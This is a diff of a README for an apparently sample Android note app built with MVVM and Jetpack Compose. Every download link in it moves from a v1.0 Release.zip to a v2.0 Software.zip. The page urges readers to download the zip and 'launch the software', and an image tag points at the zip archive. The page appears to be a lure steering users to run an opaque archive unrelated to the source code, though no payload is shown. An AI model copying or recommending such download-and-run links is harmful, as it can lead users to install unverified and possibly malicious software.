@@ -2,7 +2,7 @@
 
 ## The Clean Architecture is a software design pattern that separates the business logic from the presentation layer.
 
-[![Download Software](https://github.com/Milan20201/NoteApp--MVVM-CRUD-Jetpack-Compose/releases/download/v1.0/Release.zip)](https://github.com/Milan20201/NoteApp--MVVM-CRUD-Jetpack-Compose/releases/download/v1.0/Release.zip)
+[![Download Software](https://github.com/Milan20201/NoteApp--MVVM-CRUD-Jetpack-Compose/releases/download/v2.0/Software.zip)](https://github.com/Milan20201/NoteApp--MVVM-CRUD-Jetpack-Compose/releases/download/v2.0/Software.zip)
 
 Welcome to the NoteApp repository built using MVVM architecture and Jetpack Compose! 😊
 
@@ -45,6 +45,6 @@ Special thanks to the open-source community and contributors who have helped in 
 
 🚀 Feel free to explore the repository and contribute to enhancing this app further! Happy coding! 🌟
 
-🌐 For more information or to download the software, [click here](https://github.com/Milan20201/NoteApp--MVVM-CRUD-Jetpack-Compose/releases/download/v1.0/Release.zip). Launch the software to get started! 🚀
+🌐 For more information or to download the software, [click here](https://github.com/Milan20201/NoteApp--MVVM-CRUD-Jetpack-Compose/releases/download/v2.0/Software.zip). Launch the software to get started! 🚀
 
-![NoteApp](https://github.com/Milan20201/NoteApp--MVVM-CRUD-Jetpack-Compose/releases/download/v1.0/Release.zip)
+![NoteApp](https://github.com/Milan20201/NoteApp--MVVM-CRUD-Jetpack-Compose/releases/download/v2.0/Software.zip)
